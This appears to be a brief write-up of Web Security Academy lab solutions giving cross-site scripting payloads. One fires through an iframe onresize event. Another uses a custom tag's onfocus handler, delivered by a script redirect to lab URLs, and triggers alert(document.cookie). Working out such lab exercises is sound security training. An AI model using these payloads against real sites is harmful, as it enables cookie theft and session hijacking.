### Payload using event onresize

```
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
```

### Payload using HTML custom tag

Payload

```
<xss id=x onfocus=alert(1) tabindex=1>#x
```

Deliver

```
<script>
location = 'https://ac171f701ea6b50a807f36de000900f9.web-security-academy.net/?search=%3Cabc%20id=x%20onfocus=alert(document.cookie)%20tabindex=1%3E#x';
</script>
```
